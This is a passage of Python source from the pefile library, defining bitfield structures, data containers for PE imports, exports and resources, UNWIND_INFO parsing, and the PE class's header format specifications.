    """

    BTF_NAME_IDX = 0
    BTF_BITCNT_IDX = 1
    CF_TYPE_IDX = 0
    CF_SUBFLD_IDX = 1

    def __init__(self, format, name=None, file_offset=None):
        (
            self.__format__,
            self.__format_length__,
            self.__field_offsets__,
            self.__keys__,
            self.__keys_ext__,
            self.__compound_fields__,
        ) = set_bitfields_format(format)
        # create our own unpacked_data_elms to ensure they are not shared among
        # StructureWithBitfields instances with the same format string
        self.__unpacked_data_elms__ = [None for i in range(self.__format_length__)]
        self.__all_zeroes__ = False
        self.__file_offset__ = file_offset
        self.name = name if name != None else format[0]

    def __unpack__(self, data):
        # calling the original routine to deal with special cases/spurious data
        # structures
        super(StructureWithBitfields, self).__unpack__(data)
        self._unpack_bitfield_attributes()

    def __pack__(self):
        self._pack_bitfield_attributes()
        try:
            data = super(StructureWithBitfields, self).__pack__()
        finally:
            self._unpack_bitfield_attributes()
        return data

    def dump(self, indentation=0):
        tk = self.__keys__
        self.__keys__ = self.__keys_ext__
        try:
            ret = super(StructureWithBitfields, self).dump(indentation)
        finally:
            self.__keys__ = tk
        return ret

    def dump_dict(self):
        tk = self.__keys__
        self.__keys__ = self.__keys_ext__
        try:
            ret = super(StructureWithBitfields, self).dump_dict()
        finally:
            self.__keys__ = tk
        return ret

    def _unpack_bitfield_attributes(self):
        """Replace compound attributes corresponding to bitfields with separate
        sub-fields.
        """
        for i in self.__compound_fields__.keys():
            cf_name = self.__keys__[i][0]
            cval = getattr(self, cf_name)
            delattr(self, cf_name)
            offst = 0
            for sf in self.__compound_fields__[i][StructureWithBitfields.CF_SUBFLD_IDX]:
                mask = (1 << sf[StructureWithBitfields.BTF_BITCNT_IDX]) - 1
                mask <<= offst
                setattr(
                    self,
                    sf[StructureWithBitfields.BTF_NAME_IDX],
                    (cval & mask) >> offst,
                )
                offst += sf[StructureWithBitfields.BTF_BITCNT_IDX]

    def _pack_bitfield_attributes(self):
        """Pack attributes into a compound bitfield"""
        for i in self.__compound_fields__.keys():
            cf_name = self.__keys__[i][0]
            offst, acc_val = 0, 0
            for sf in self.__compound_fields__[i][StructureWithBitfields.CF_SUBFLD_IDX]:
                mask = (1 << sf[StructureWithBitfields.BTF_BITCNT_IDX]) - 1
                field_val = (
                    getattr(self, sf[StructureWithBitfields.BTF_NAME_IDX]) & mask
                )
                acc_val |= field_val << offst
                offst += sf[StructureWithBitfields.BTF_BITCNT_IDX]
            setattr(self, cf_name, acc_val)


class DataContainer:
    """Generic data container."""

    def __init__(self, **args):
        bare_setattr = super(DataContainer, self).__setattr__
        for key, value in args.items():
            bare_setattr(key, value)


class ImportDescData(DataContainer):
    """Holds import descriptor information.

    dll:        name of the imported DLL
    imports:    list of imported symbols (ImportData instances)
    struct:     IMAGE_IMPORT_DESCRIPTOR structure
    """


class ImportData(DataContainer):
    """Holds imported symbol's information.

    ordinal:    Ordinal of the symbol
    name:       Name of the symbol
    bound:      If the symbol is bound, this contains
                the address.
    """

    def __setattr__(self, name, val):

        # If the instance doesn't yet have an ordinal attribute
        # it's not fully initialized so can't do any of the
        # following
        #
        if (
            hasattr(self, "ordinal")
            and hasattr(self, "bound")
            and hasattr(self, "name")
        ):

            if name == "ordinal":

                if self.pe.PE_TYPE == OPTIONAL_HEADER_MAGIC_PE:
                    ordinal_flag = IMAGE_ORDINAL_FLAG
                elif self.pe.PE_TYPE == OPTIONAL_HEADER_MAGIC_PE_PLUS:
                    ordinal_flag = IMAGE_ORDINAL_FLAG64

                # Set the ordinal and flag the entry as importing by ordinal
                self.struct_table.Ordinal = ordinal_flag | (val & 0xFFFF)
                self.struct_table.AddressOfData = self.struct_table.Ordinal
                self.struct_table.Function = self.struct_table.Ordinal
                self.struct_table.ForwarderString = self.struct_table.Ordinal
            elif name == "bound":
                if self.struct_iat is not None:
                    self.struct_iat.AddressOfData = val
                    self.struct_iat.AddressOfData = self.struct_iat.AddressOfData
                    self.struct_iat.Function = self.struct_iat.AddressOfData
                    self.struct_iat.ForwarderString = self.struct_iat.AddressOfData
            elif name == "address":
                self.struct_table.AddressOfData = val
                self.struct_table.Ordinal = self.struct_table.AddressOfData
                self.struct_table.Function = self.struct_table.AddressOfData
                self.struct_table.ForwarderString = self.struct_table.AddressOfData
            elif name == "name":
                # Make sure we reset the entry in case the import had been set to
                # import by ordinal
                if self.name_offset:

                    name_rva = self.pe.get_rva_from_offset(self.name_offset)
                    self.pe.set_dword_at_offset(
                        self.ordinal_offset, (0 << 31) | name_rva
                    )

                    # Complain if the length of the new name is longer than the
                    # existing one
                    if len(val) > len(self.name):
                        raise PEFormatError(
                            "The export name provided is longer than the existing one."
                        )
                        pass
                    self.pe.set_bytes_at_offset(self.name_offset, val)

        self.__dict__[name] = val


class ExportDirData(DataContainer):
    """Holds export directory information.

    struct:     IMAGE_EXPORT_DIRECTORY structure
    symbols:    list of exported symbols (ExportData instances)"""


class ExportData(DataContainer):
    """Holds exported symbols' information.

    ordinal:    ordinal of the symbol
    address:    address of the symbol
    name:       name of the symbol (None if the symbol is
                exported by ordinal only)
    forwarder:  if the symbol is forwarded it will
                contain the name of the target symbol,
                None otherwise.
    """

    def __setattr__(self, name, val):

        # If the instance doesn't yet have an ordinal attribute
        # it's not fully initialized so can't do any of the
        # following
        #
        if (
            hasattr(self, "ordinal")
            and hasattr(self, "address")
            and hasattr(self, "forwarder")
            and hasattr(self, "name")
        ):

            if name == "ordinal":
                self.pe.set_word_at_offset(self.ordinal_offset, val)
            elif name == "address":
                self.pe.set_dword_at_offset(self.address_offset, val)
            elif name == "name":
                # Complain if the length of the new name is longer than the
                # existing one
                if len(val) > len(self.name):
                    raise PEFormatError(
                        "The export name provided is longer than the existing one."
                    )
                self.pe.set_bytes_at_offset(self.name_offset, val)
            elif name == "forwarder":
                # Complain if the length of the new name is longer than the
                # existing one
                if len(val) > len(self.forwarder):
                    raise PEFormatError(
                        "The forwarder name provided is longer than the existing one."
                    )
                self.pe.set_bytes_at_offset(self.forwarder_offset, val)

        self.__dict__[name] = val


class ResourceDirData(DataContainer):
    """Holds resource directory information.

    struct:     IMAGE_RESOURCE_DIRECTORY structure
    entries:    list of entries (ResourceDirEntryData instances)
    """


class ResourceDirEntryData(DataContainer):
    """Holds resource directory entry data.

    struct:     IMAGE_RESOURCE_DIRECTORY_ENTRY structure
    name:       If the resource is identified by name this
                attribute will contain the name string. None
                otherwise. If identified by id, the id is
                available at 'struct.Id'
    id:         the id, also in struct.Id
    directory:  If this entry has a lower level directory
                this attribute will point to the
                ResourceDirData instance representing it.
    data:       If this entry has no further lower directories
                and points to the actual resource data, this
                attribute will reference the corresponding
                ResourceDataEntryData instance.
    (Either of the 'directory' or 'data' attribute will exist,
    but not both.)
    """


class ResourceDataEntryData(DataContainer):
    """Holds resource data entry information.

    struct:     IMAGE_RESOURCE_DATA_ENTRY structure
    lang:       Primary language ID
    sublang:    Sublanguage ID
    """


class DebugData(DataContainer):
    """Holds debug information.

    struct:     IMAGE_DEBUG_DIRECTORY structure
    entries:    list of entries (IMAGE_DEBUG_TYPE instances)
    """


class BaseRelocationData(DataContainer):
    """Holds base relocation information.

    struct:     IMAGE_BASE_RELOCATION structure
    entries:    list of relocation data (RelocationData instances)
    """


class RelocationData(DataContainer):
    """Holds relocation information.

    type:       Type of relocation
                The type string can be obtained by
                RELOCATION_TYPE[type]
    rva:        RVA of the relocation
    """

    def __setattr__(self, name, val):

        # If the instance doesn't yet have a struct attribute
        # it's not fully initialized so can't do any of the
        # following
        #
        if hasattr(self, "struct"):
            # Get the word containing the type and data
            #
            word = self.struct.Data

            if name == "type":
                word = (val << 12) | (word & 0xFFF)
            elif name == "rva":
                offset = max(val - self.base_rva, 0)
                word = (word & 0xF000) | (offset & 0xFFF)

            # Store the modified data
            #
            self.struct.Data = word

        self.__dict__[name] = val


class TlsData(DataContainer):
    """Holds TLS information.

    struct:     IMAGE_TLS_DIRECTORY structure
    """


class BoundImportDescData(DataContainer):
    """Holds bound import descriptor data.

    This directory entry will provide information on the
    DLLs this PE file has been bound to (if bound at all).
    The structure will contain the name and timestamp of the
    DLL at the time of binding so that the loader can know
    whether it differs from the one currently present in the
    system and must, therefore, re-bind the PE's imports.

    struct:     IMAGE_BOUND_IMPORT_DESCRIPTOR structure
    name:       DLL name
    entries:    list of entries (BoundImportRefData instances)
                the entries will exist if this DLL has forwarded
                symbols. If so, the destination DLL will have an
                entry in this list.
    """


class LoadConfigData(DataContainer):
    """Holds Load Config data.

    struct:     IMAGE_LOAD_CONFIG_DIRECTORY structure
    name:       dll name
    """


class BoundImportRefData(DataContainer):
    """Holds bound import forwarder reference data.

    Contains the same information as the bound descriptor but
    for forwarded DLLs, if any.

    struct:     IMAGE_BOUND_FORWARDER_REF structure
    name:       dll name
    """


class ExceptionsDirEntryData(DataContainer):
    """Holds the data related to SEH (and stack unwinding, in particular)

    struct      an instance of RUNTIME_FUNTION
    unwindinfo  an instance of UNWIND_INFO
    """


class UnwindInfo(StructureWithBitfields):
    """Handles the complexities of UNWIND_INFO structure:
    * variable number of UWIND_CODEs
    * optional ExceptionHandler and FunctionEntry fields
    """

    def __init__(self, file_offset=0):
        super(UnwindInfo, self).__init__(
            (
                "UNWIND_INFO",
                (
                    "B:3,Version",
                    "B:5,Flags",
                    "B,SizeOfProlog",
                    "B,CountOfCodes",
                    "B:4,FrameRegister",
                    "B:4,FrameOffset",
                ),
            ),
            file_offset=file_offset,
        )
        self._full_size = super(UnwindInfo, self).sizeof()
        self._opt_field_name = None
        self._code_info = StructureWithBitfields(
            ("UNWIND_CODE", ("B,CodeOffset", "B:4,UnwindOp", "B:4,OpInfo")),
            file_offset=0,
        )
        self._chained_entry = None
        self._finished_unpacking = False

    def unpack_in_stages(self, data):
        """Unpacks the UNWIND_INFO "in two calls", with the first call establishing
        a full size of the structure and the second, performing the actual unpacking.
        """
        if self._finished_unpacking:
            return None

        super(UnwindInfo, self).__unpack__(data)
        codes_cnt_max = (self.CountOfCodes + 1) & ~1
        hdlr_offset = (
            super(UnwindInfo, self).sizeof() + codes_cnt_max * self._code_info.sizeof()
        )
        self._full_size = hdlr_offset + (
            0 if self.Flags == 0 else STRUCT_SIZEOF_TYPES["I"]
        )

        if len(data) < self._full_size:
            return None

        if self.Version != 1 and self.Version != 2:
            return "Unsupported version of UNWIND_INFO at " + hex(self.__file_offset__)

        self.UnwindCodes = []
        ro = super(UnwindInfo, self).sizeof()
        codes_left = self.CountOfCodes
        while codes_left > 0:
            self._code_info.__unpack__(data[ro : ro + self._code_info.sizeof()])
            ucode = PrologEpilogOpsFactory.create(self._code_info)
            if ucode is None:
                return "Unknown UNWIND_CODE at " + hex(self.__file_offset__ + ro)

            len_in_codes = ucode.length_in_code_structures(self._code_info, self)
            opc_size = self._code_info.sizeof() * len_in_codes
            ucode.initialize(
                self._code_info,
                data[ro : ro + opc_size],
                self,
                self.__file_offset__ + ro,
            )
            ro += opc_size
            codes_left -= len_in_codes
            self.UnwindCodes.append(ucode)

        if self.UNW_FLAG_EHANDLER or self.UNW_FLAG_UHANDLER:
            self._opt_field_name = "ExceptionHandler"

        if self.UNW_FLAG_CHAININFO:
            self._opt_field_name = "FunctionEntry"

        if self._opt_field_name != None:
            setattr(
                self,
                self._opt_field_name,
                struct.unpack(
                    "<I", data[hdlr_offset : hdlr_offset + STRUCT_SIZEOF_TYPES["I"]]
                )[0],
            )

        self._finished_unpacking = True

        return None

    def dump(self, indentation=0):
        # Because __keys_ext__ are shared among all the instances with the same
        # format string, we have to add and sunsequently remove the optional field
        # each time.
        # It saves space (as compared to keeping a copy self.__keys_ext__ per
        # UnwindInfo instance), but makes our dump() implementation thread-unsafe.
        if self._opt_field_name != None:
            self.__field_offsets__[self._opt_field_name] = (
                self._full_size - STRUCT_SIZEOF_TYPES["I"]
            )
            self.__keys_ext__.append([self._opt_field_name])
        try:
            dump = super(UnwindInfo, self).dump(indentation)
        finally:
            if self._opt_field_name != None:
                self.__keys_ext__.pop()

        dump.append(
            "Flags: "
            + ", ".join([s[0] for s in unwind_info_flags if getattr(self, s[0])])
        )
        dump.append(
            "Unwind codes: "
            + "; ".join([str(c) for c in self.UnwindCodes if c.is_valid()])
        )
        return dump

    def dump_dict(self):
        if self._opt_field_name != None:
            self.__field_offsets__[self._opt_field_name] = (
                self._full_size - STRUCT_SIZEOF_TYPES["I"]
            )
            self.__keys_ext__.append([self._opt_field_name])
        try:
            ret = super(UnwindInfo, self).dump_dict()
        finally:
            if self._opt_field_name != None:
                self.__keys_ext__.pop()
        return ret

    def __setattr__(self, name, val):
        if name == "Flags":
            set_flags(self, val, unwind_info_flags)
        elif "UNW_FLAG_" in name and hasattr(self, name):
            if val:
                self.__dict__["Flags"] |= UNWIND_INFO_FLAGS[name]
            else:
                self.__dict__["Flags"] ^= UNWIND_INFO_FLAGS[name]
        self.__dict__[name] = val

    def sizeof(self):
        return self._full_size

    def __pack__(self):
        data = bytearray(self._full_size)
        data[0 : super(UnwindInfo, self).sizeof()] = super(UnwindInfo, self).__pack__()
        cur_offset = super(UnwindInfo, self).sizeof()

        for uc in self.UnwindCodes:
            if cur_offset + uc.struct.sizeof() > self._full_size:
                break
            data[cur_offset : cur_offset + uc.struct.sizeof()] = uc.struct.__pack__()
            cur_offset += uc.struct.sizeof()

        if self._opt_field_name != None:
            data[
                self._full_size - STRUCT_SIZEOF_TYPES["I"] : self._full_size
            ] = struct.pack("<I", getattr(self, self._opt_field_name))

        return data

    def get_chained_function_entry(self):
        return self._chained_entry

    def set_chained_function_entry(self, entry):
        if self._chained_entry != None:
            raise PEFormatError("Chained function entry cannot be changed")
        self._chained_entry = entry


class PrologEpilogOp:
    """Meant as an abstract class representing a generic unwind code.
    There is a subclass of PrologEpilogOp for each member of UNWIND_OP_CODES enum.
    """

    def initialize(self, unw_code, data, unw_info, file_offset):
        self.struct = StructureWithBitfields(
            self._get_format(unw_code), file_offset=file_offset
        )
        self.struct.__unpack__(data)

    def length_in_code_structures(self, unw_code, unw_info):
        """Computes how many UNWIND_CODE structures UNWIND_CODE occupies.
        May be called before initialize() and, for that reason, should not rely on
        the values of intance attributes.
        """
        return 1

    def is_valid(self):
        return True

    def _get_format(self, unw_code):
        return ("UNWIND_CODE", ("B,CodeOffset", "B:4,UnwindOp", "B:4,OpInfo"))


class PrologEpilogOpPushReg(PrologEpilogOp):
    """UWOP_PUSH_NONVOL"""

    def _get_format(self, unw_code):
        return ("UNWIND_CODE_PUSH_NONVOL", ("B,CodeOffset", "B:4,UnwindOp", "B:4,Reg"))

    def __str__(self):
        return ".PUSHREG " + REGISTERS[self.struct.Reg]


class PrologEpilogOpAllocLarge(PrologEpilogOp):
    """UWOP_ALLOC_LARGE"""

    def _get_format(self, unw_code):
        return (
            "UNWIND_CODE_ALLOC_LARGE",
            (
                "B,CodeOffset",
                "B:4,UnwindOp",
                "B:4,OpInfo",
                "H,AllocSizeInQwords" if unw_code.OpInfo == 0 else "I,AllocSize",
            ),
        )

    def length_in_code_structures(self, unw_code, unw_info):
        return 2 if unw_code.OpInfo == 0 else 3

    def get_alloc_size(self):
        return (
            self.struct.AllocSizeInQwords * 8
            if self.struct.OpInfo == 0
            else self.struct.AllocSize
        )

    def __str__(self):
        return ".ALLOCSTACK " + hex(self.get_alloc_size())


class PrologEpilogOpAllocSmall(PrologEpilogOp):
    """UWOP_ALLOC_SMALL"""

    def _get_format(self, unw_code):
        return (
            "UNWIND_CODE_ALLOC_SMALL",
            ("B,CodeOffset", "B:4,UnwindOp", "B:4,AllocSizeInQwordsMinus8"),
        )

    def get_alloc_size(self):
        return self.struct.AllocSizeInQwordsMinus8 * 8 + 8

    def __str__(self):
        return ".ALLOCSTACK " + hex(self.get_alloc_size())


class PrologEpilogOpSetFP(PrologEpilogOp):
    """UWOP_SET_FPREG"""

    def initialize(self, unw_code, data, unw_info, file_offset):
        super(PrologEpilogOpSetFP, self).initialize(
            unw_code, data, unw_info, file_offset
        )
        self._frame_register = unw_info.FrameRegister
        self._frame_offset = unw_info.FrameOffset * 16

    def __str__(self):
        return (
            ".SETFRAME "
            + REGISTERS[self._frame_register]
            + ", "
            + hex(self._frame_offset)
        )


class PrologEpilogOpSaveReg(PrologEpilogOp):
    """UWOP_SAVE_NONVOL"""

    def length_in_code_structures(self, unwcode, unw_info):
        return 2

    def get_offset(self):
        return self.struct.OffsetInQwords * 8

    def _get_format(self, unw_code):
        return (
            "UNWIND_CODE_SAVE_NONVOL",
            ("B,CodeOffset", "B:4,UnwindOp", "B:4,Reg", "H,OffsetInQwords"),
        )

    def __str__(self):
        return ".SAVEREG " + REGISTERS[self.struct.Reg] + ", " + hex(self.get_offset())


class PrologEpilogOpSaveRegFar(PrologEpilogOp):
    """UWOP_SAVE_NONVOL_FAR"""

    def length_in_code_structures(self, unw_code, unw_info):
        return 3

    def get_offset(self):
        return self.struct.Offset

    def _get_format(self, unw_code):
        return (
            "UNWIND_CODE_SAVE_NONVOL_FAR",
            ("B,CodeOffset", "B:4,UnwindOp", "B:4,Reg", "I,Offset"),
        )

    def __str__(self):
        return ".SAVEREG " + REGISTERS[self.struct.Reg] + ", " + hex(self.struct.Offset)


class PrologEpilogOpSaveXMM(PrologEpilogOp):
    """UWOP_SAVE_XMM128"""

    def _get_format(self, unw_code):
        return (
            "UNWIND_CODE_SAVE_XMM128",
            ("B,CodeOffset", "B:4,UnwindOp", "B:4,Reg", "H,OffsetIn2Qwords"),
        )

    def length_in_code_structures(self, unw_code, unw_info):
        return 2

    def get_offset(self):
        return self.struct.OffsetIn2Qwords * 16

    def __str__(self):
        return ".SAVEXMM128 XMM" + str(self.struct.Reg) + ", " + hex(self.get_offset())


class PrologEpilogOpSaveXMMFar(PrologEpilogOp):
    """UWOP_SAVE_XMM128_FAR"""

    def _get_format(self, unw_code):
        return (
            "UNWIND_CODE_SAVE_XMM128_FAR",
            ("B,CodeOffset", "B:4,UnwindOp", "B:4,Reg", "I,Offset"),
        )

    def length_in_code_structures(self, unw_code, unw_info):
        return 3

    def get_offset(self):
        return self.struct.Offset

    def __str__(self):
        return ".SAVEXMM128 XMM" + str(self.struct.Reg) + ", " + hex(self.struct.Offset)


class PrologEpilogOpPushFrame(PrologEpilogOp):
    """UWOP_PUSH_MACHFRAME"""

    def __str__(self):
        return ".PUSHFRAME" + (" <code>" if self.struct.OpInfo else "")


class PrologEpilogOpEpilogMarker(PrologEpilogOp):
    """UWOP_EPILOG"""

    def initialize(self, unw_code, data, unw_info, file_offset):
        self._long_offst = True
        self._first = not hasattr(unw_info, "SizeOfEpilog")
        super(PrologEpilogOpEpilogMarker, self).initialize(
            unw_code, data, unw_info, file_offset
        )
        if self._first:
            setattr(unw_info, "SizeOfEpilog", self.struct.Size)
            self._long_offst = unw_code.OpInfo & 1 == 0
        self._epilog_size = unw_info.SizeOfEpilog

    def _get_format(self, unw_code):
        # check if it is the first epilog code among encountered; then its record
        # will contain size of the epilog
        if self._first:
            return (
                "UNWIND_CODE_EPILOG",
                ("B,OffsetLow,Size", "B:4,UnwindOp", "B:4,Flags")
                if unw_code.OpInfo & 1 == 1
                else (
                    "B,Size",
                    "B:4,UnwindOp",
                    "B:4,Flags",
                    "B,OffsetLow",
                    "B:4,Unused",
                    "B:4,OffsetHigh",
                ),
            )
        else:
            return (
                "UNWIND_CODE_EPILOG",
                ("B,OffsetLow", "B:4,UnwindOp", "B:4,OffsetHigh"),
            )

    def length_in_code_structures(self, unw_code, unw_info):
        return (
            2
            if not hasattr(unw_info, "SizeOfEpilog") and (unw_code.OpInfo & 1) == 0
            else 1
        )

    def get_offset(self):
        return self.struct.OffsetLow | (
            self.struct.OffsetHigh << 8 if self._long_offst else 0
        )

    def is_valid(self):
        return self.get_offset() > 0

    def __str__(self):
        # the EPILOG sequence may have a terminating all-zeros entry
        return (
            "EPILOG: size="
            + hex(self._epilog_size)
            + ", offset from the end=-"
            + hex(self.get_offset())
            if self.get_offset() > 0
            else ""
        )


class PrologEpilogOpsFactory:
    """A factory for creating unwind codes based on the value of UnwindOp"""

    _class_dict = {
        UWOP_PUSH_NONVOL: PrologEpilogOpPushReg,
        UWOP_ALLOC_LARGE: PrologEpilogOpAllocLarge,
        UWOP_ALLOC_SMALL: PrologEpilogOpAllocSmall,
        UWOP_SET_FPREG: PrologEpilogOpSetFP,
        UWOP_SAVE_NONVOL: PrologEpilogOpSaveReg,
        UWOP_SAVE_NONVOL_FAR: PrologEpilogOpSaveRegFar,
        UWOP_SAVE_XMM128: PrologEpilogOpSaveXMM,
        UWOP_SAVE_XMM128_FAR: PrologEpilogOpSaveXMMFar,
        UWOP_PUSH_MACHFRAME: PrologEpilogOpPushFrame,
        UWOP_EPILOG: PrologEpilogOpEpilogMarker,
    }

    @staticmethod
    def create(unwcode):
        code = unwcode.UnwindOp
        return (
            PrologEpilogOpsFactory._class_dict[code]()
            if code in PrologEpilogOpsFactory._class_dict
            else None
        )


# Valid FAT32 8.3 short filename characters according to:
#  http://en.wikipedia.org/wiki/8.3_filename
# This will help decide whether DLL ASCII names are likely
# to be valid or otherwise corrupt data
#
# The filename length is not checked because the DLLs filename
# can be longer that the 8.3

allowed_filename = b(
    string.ascii_lowercase
    + string.ascii_uppercase
    + string.digits
    + "!#$%&'()-@^_`{}~+,.;=[]"
)


def is_valid_dos_filename(s):
    if s is None or not isinstance(s, (str, bytes, bytearray)):
        return False
    # Allow path separators as import names can contain directories.
    allowed = allowed_filename + b"\\/"
    return all(c in allowed for c in set(s))


# Check if an imported name uses the valid accepted characters expected in
# mangled function names. If the symbol's characters don't fall within this
# charset we will assume the name is invalid.
# The dot "." character comes from: https://github.com/erocarrera/pefile/pull/346
allowed_function_name = b(
    string.ascii_lowercase + string.ascii_uppercase + string.digits + "._?@$()<>"
)


@lru_cache(maxsize=2048)
def is_valid_function_name(s):
    return (
        s is not None
        and isinstance(s, (str, bytes, bytearray))
        and all(c in allowed_function_name for c in set(s))
    )


class PE:
    """A Portable Executable representation.

    This class provides access to most of the information in a PE file.

    It expects to be supplied the name of the file to load or PE data
    to process and an optional argument 'fast_load' (False by default)
    which controls whether to load all the directories information,
    which can be quite time consuming.

    pe = pefile.PE('module.dll')
    pe = pefile.PE(name='module.dll')

    would load 'module.dll' and process it. If the data is already
    available in a buffer the same can be achieved with:

    pe = pefile.PE(data=module_dll_data)

    The "fast_load" can be set to a default by setting its value in the
    module itself by means, for instance, of a "pefile.fast_load = True".
    That will make all the subsequent instances not to load the
    whole PE structure. The "full_load" method can be used to parse
    the missing data at a later stage.

    Basic headers information will be available in the attributes:

    DOS_HEADER
    NT_HEADERS
    FILE_HEADER
    OPTIONAL_HEADER

    All of them will contain among their attributes the members of the
    corresponding structures as defined in WINNT.H

    The raw data corresponding to the header (from the beginning of the
    file up to the start of the first section) will be available in the
    instance's attribute 'header' as a string.

    The sections will be available as a list in the 'sections' attribute.
    Each entry will contain as attributes all the structure's members.

    Directory entries will be available as attributes (if they exist):
    (no other entries are processed at this point)

    DIRECTORY_ENTRY_IMPORT (list of ImportDescData instances)
    DIRECTORY_ENTRY_EXPORT (ExportDirData instance)
    DIRECTORY_ENTRY_RESOURCE (ResourceDirData instance)
    DIRECTORY_ENTRY_DEBUG (list of DebugData instances)
    DIRECTORY_ENTRY_BASERELOC (list of BaseRelocationData instances)
    DIRECTORY_ENTRY_TLS
    DIRECTORY_ENTRY_BOUND_IMPORT (list of BoundImportData instances)

    The following dictionary attributes provide ways of mapping different
    constants. They will accept the numeric value and return the string
    representation and the opposite, feed in the string and get the
    numeric constant:

    DIRECTORY_ENTRY
    IMAGE_CHARACTERISTICS
    SECTION_CHARACTERISTICS
    DEBUG_TYPE
    SUBSYSTEM_TYPE
    MACHINE_TYPE
    RELOCATION_TYPE
    RESOURCE_TYPE
    LANG
    SUBLANG
    """

    #
    # Format specifications for PE structures.
    #

    __IMAGE_DOS_HEADER_format__ = (
        "IMAGE_DOS_HEADER",
        (
            "H,e_magic",
            "H,e_cblp",
            "H,e_cp",
            "H,e_crlc",
            "H,e_cparhdr",
            "H,e_minalloc",
            "H,e_maxalloc",
            "H,e_ss",
            "H,e_sp",
            "H,e_csum",
            "H,e_ip",
            "H,e_cs",
            "H,e_lfarlc",
            "H,e_ovno",
            "8s,e_res",
            "H,e_oemid",
            "H,e_oeminfo",
            "20s,e_res2",
            "I,e_lfanew",
        ),
    )

    __IMAGE_FILE_HEADER_format__ = (
        "IMAGE_FILE_HEADER",
        (
            "H,Machine",
            "H,NumberOfSections",
            "I,TimeDateStamp",
            "I,PointerToSymbolTable",
            "I,NumberOfSymbols",
            "H,SizeOfOptionalHeader",
            "H,Characteristics",
        ),
    )

    __IMAGE_DATA_DIRECTORY_format__ = (
        "IMAGE_DATA_DIRECTORY",
        ("I,VirtualAddress", "I,Size"),
    )

    __IMAGE_OPTIONAL_HEADER_format__ = (
        "IMAGE_OPTIONAL_HEADER",
        (
            "H,Magic",
            "B,MajorLinkerVersion",
            "B,MinorLinkerVersion",
            "I,SizeOfCode",
            "I,SizeOfInitializedData",
            "I,SizeOfUninitializedData",
            "I,AddressOfEntryPoint",
            "I,BaseOfCode",
            "I,BaseOfData",
            "I,ImageBase",
            "I,SectionAlignment",
            "I,FileAlignment",
            "H,MajorOperatingSystemVersion",
            "H,MinorOperatingSystemVersion",
            "H,MajorImageVersion",
            "H,MinorImageVersion",
            "H,MajorSubsystemVersion",
            "H,MinorSubsystemVersion",
            "I,Reserved1",
            "I,SizeOfImage",
            "I,SizeOfHeaders",
            "I,CheckSum",
            "H,Subsystem",
            "H,DllCharacteristics",
            "I,SizeOfStackReserve",
            "I,SizeOfStackCommit",
            "I,SizeOfHeapReserve",
            "I,SizeOfHeapCommit",
            "I,LoaderFlags",
            "I,NumberOfRvaAndSizes",
        ),
    )

    __IMAGE_OPTIONAL_HEADER64_format__ = (
        "IMAGE_OPTIONAL_HEADER64",
        (
            "H,Magic",
            "B,MajorLinkerVersion",
            "B,MinorLinkerVersion",
            "I,SizeOfCode",
            "I,SizeOfInitializedData",
            "I,SizeOfUninitializedData",
            "I,AddressOfEntryPoint",
            "I,BaseOfCode",
            "Q,ImageBase",
            "I,SectionAlignment",
            "I,FileAlignment",
            "H,MajorOperatingSystemVersion",
            "H,MinorOperatingSystemVersion",
            "H,MajorImageVersion",
            "H,MinorImageVersion",
            "H,MajorSubsystemVersion",
            "H,MinorSubsystemVersion",
            "I,Reserved1",
            "I,SizeOfImage",
            "I,SizeOfHeaders",
            "I,CheckSum",
            "H,Subsystem",
            "H,DllCharacteristics",
            "Q,SizeOfStackReserve",
            "Q,SizeOfStackCommit",
            "Q,SizeOfHeapReserve",
            "Q,SizeOfHeapCommit",
            "I,LoaderFlags",
            "I,NumberOfRvaAndSizes",
        ),
    )

    __IMAGE_NT_HEADERS_format__ = ("IMAGE_NT_HEADERS", ("I,Signature",))

    __IMAGE_SECTION_HEADER_format__ = (
        "IMAGE_SECTION_HEADER",
        (
            "8s,Name",
            "I,Misc,Misc_PhysicalAddress,Misc_VirtualSize",
            "I,VirtualAddress",
            "I,SizeOfRawData",
            "I,PointerToRawData",
            "I,PointerToRelocations",
            "I,PointerToLinenumbers",
            "H,NumberOfRelocations",
            "H,NumberOfLinenumbers",
            "I,Characteristics",
        ),
    )

    __IMAGE_DELAY_IMPORT_DESCRIPTOR_format__ = (
        "IMAGE_DELAY_IMPORT_DESCRIPTOR",
        (
            "I,grAttrs",
            "I,szName",
            "I,phmod",
            "I,pIAT",
            "I,pINT",
            "I,pBoundIAT",
            "I,pUnloadIAT",
            "I,dwTimeStamp",
        ),
    )

    __IMAGE_IMPORT_DESCRIPTOR_format__ = (
        "IMAGE_IMPORT_DESCRIPTOR",
        (
            "I,OriginalFirstThunk,Characteristics",
            "I,TimeDateStamp",
            "I,ForwarderChain",
            "I,Name",
            "I,FirstThunk",
        ),
    )

    __IMAGE_EXPORT_DIRECTORY_format__ = (
        "IMAGE_EXPORT_DIRECTORY",
        (
            "I,Characteristics",
            "I,TimeDateStamp",
            "H,MajorVersion",
            "H,MinorVersion",
            "I,Name",
            "I,Base",
            "I,NumberOfFunctions",
            "I,NumberOfNames",
            "I,AddressOfFunctions",
            "I,AddressOfNames",
            "I,AddressOfNameOrdinals",
        ),
    )

    __IMAGE_RESOURCE_DIRECTORY_format__ = (
        "IMAGE_RESOURCE_DIRECTORY",
        (
            "I,Characteristics",
            "I,TimeDateStamp",
            "H,MajorVersion",
            "H,MinorVersion",
            "H,NumberOfNamedEntries",
            "H,NumberOfIdEntries",
        ),
    )

    __IMAGE_RESOURCE_DIRECTORY_ENTRY_format__ = (
        "IMAGE_RESOURCE_DIRECTORY_ENTRY",
        ("I,Name", "I,OffsetToData"),
    )

    __IMAGE_RESOURCE_DATA_ENTRY_format__ = (
        "IMAGE_RESOURCE_DATA_ENTRY",
        ("I,OffsetToData", "I,Size", "I,CodePage", "I,Reserved"),
    )

    __VS_VERSIONINFO_format__ = (
        "VS_VERSIONINFO",
        ("H,Length", "H,ValueLength", "H,Type"),
    )

    __VS_FIXEDFILEINFO_format__ = (
        "VS_FIXEDFILEINFO",
        (
            "I,Signature",
            "I,StrucVersion",
            "I,FileVersionMS",
            "I,FileVersionLS",
            "I,ProductVersionMS",
            "I,ProductVersionLS",
            "I,FileFlagsMask",
            "I,FileFlags",
            "I,FileOS",
            "I,FileType",
            "I,FileSubtype",
            "I,FileDateMS",
            "I,FileDateLS",
        ),
    )

    __StringFileInfo_format__ = (
        "StringFileInfo",
        ("H,Length", "H,ValueLength", "H,Type"),
    )

    __StringTable_format__ = ("StringTable", ("H,Length", "H,ValueLength", "H,Type"))

    __String_format__ = ("String", ("H,Length", "H,ValueLength", "H,Type"))

